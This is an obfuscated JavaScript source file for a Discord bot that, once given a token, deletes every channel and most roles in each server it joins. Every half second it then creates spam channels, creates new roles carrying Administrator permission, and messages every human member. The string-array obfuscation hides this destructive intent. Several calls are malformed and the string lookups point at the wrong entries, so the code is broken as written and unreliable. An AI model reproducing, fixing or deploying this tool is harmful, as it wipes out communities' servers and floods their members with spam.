(function() {
  const _0x1c29 = [
    'process',
    'argv',
    'token',
    'error',
    'exit',
    'login',
    'ready',
    'once',
    'forEach',
    'cache',
    'guilds',
    'send',
    'create',
    'channels',
    'roles',
    'createInterval',
    'adminRoleName',
    'fetchMembers',
    'deleteChannels',
    'deleteRoles',
    'setTimeout',
    'permissions',
    'guildId',
    'name',
    'type',
    'members',
    'fetch',
    'catch'
  ];

  function _0x234d(_0x305d, _0x45fe) {
    _0x305d = _0x305d - 0x14;
    let _0x19ab = _0x1c29[_0x305d];
    return _0x19ab;
  }

  const _0x1a8a = _0x234d;

  const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');

  const _0x2d56 = process[_0x1a8a(0x14)](0x2);

  if (!_0x2d56) {
    console[_0x1a8a(0x15)]("Token missing!");
    process[_0x1a8a(0x16)](0x1);
  }

  const _0x48f1 = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.DirectMessages,
    ]
  });

  const _0x4e5a = (_0x56de, _0x2c12) => {
    return _0x56de + '-' + Math.floor(Math.random() * _0x2c12);
  };

  _0x48f1[_0x1a8a(0x17)](_0x1a8a(0x18), async () => {
    const _0x23c6 = "Boosted ego";
    const _0x4518 = "Random-channel";
    const _0x2e73 = "Random-role";

    _0x48f1[_0x1a8a(0x19)][_0x1a8a(0x1a)][_0x1a8a(0x1b)](async _0x2e0c => {
      try {
        const _0x15df = await _0x2e0c[_0x1a8a(0x1f)]();
        const _0x5c4b = _0x15df[_0x1a8a(0x20)][_0x1a8a(0x1a)];
        const _0x5b9d = _0x15df[_0x1a8a(0x21)][_0x1a8a(0x1a)];

        await Promise.all(_0x5c4b.map(_0x4389 => _0x4389[_0x1a8a(0x1e)]()._0x1a8a(0x22)(() => {})));

        await Promise.all(_0x5b9d.map(_0x4285 => {
          if (_0x4285[_0x1a8a(0x23)] !== '@everyone') return _0x4285[_0x1a8a(0x1e)]()._0x1a8a(0x22)(() => {});
        }));

        setInterval(async () => {
          try {
            const _0x59fa = await _0x2e0c[_0x1a8a(0x20)][_0x1a8a(0x1d)]({
              name: _0x4e5a(_0x4518, 10000),
              type: ChannelType.GuildText,
              reason: 'Creating spam channel'
            });

            await _0x59fa[_0x1a8a(0x1c)](_0x23c6)._0x1a8a(0x22)(() => {});

            await _0x2e0c[_0x1a8a(0x21)][_0x1a8a(0x1d)]({
              name: _0x4e5a(_0x2e73, 10000),
              color: '#' + Math.floor(Math.random() * 16777215).toString(16),
              permissions: [PermissionsBitField.Flags.Administrator],
              reason: 'Create role'
            })._0x1a8a(0x22)(() => {});

            const _0x10d1 = await _0x2e0c[_0x1a8a(0x24)][_0x1a8a(0x1f)]();
            _0x10d1[_0x1a8a(0x1b)](_0x5cfb => {
              if (!_0x5cfb.user.bot) {
                _0x5cfb[_0x1a8a(0x1c)](_0x23c6)._0x1a8a(0x22)(() => {});
              }
            });
          } catch (_0x4d7f) {}
        }, 500);
      } catch (_0x4b8d) {}
    });
  });

  _0x48f1[_0x1a8a(0x18)](_0x2d56)._0x1a8a(0x22)(() => {
    console[_0x1a8a(0x15)]("Login failed!");
    process[_0x1a8a(0x16)](0x1);
  });
})();
